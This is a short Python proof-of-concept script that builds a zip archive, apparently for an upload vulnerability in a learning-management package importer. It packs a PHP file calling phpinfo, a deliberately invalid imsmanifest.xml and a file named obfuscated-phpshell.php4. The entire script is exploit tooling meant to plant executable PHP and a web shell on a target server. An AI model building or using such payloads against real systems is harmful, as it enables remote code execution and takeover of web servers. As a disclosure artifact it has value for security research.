#!/usr/bin/python

import zipfile
from io import BytesIO

def _build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('poc2/poc2.php4', '<?php phpinfo(); ?>')
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.write('obfuscated-phpshell.php4')
    z.close()
    zip = open('poc2.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
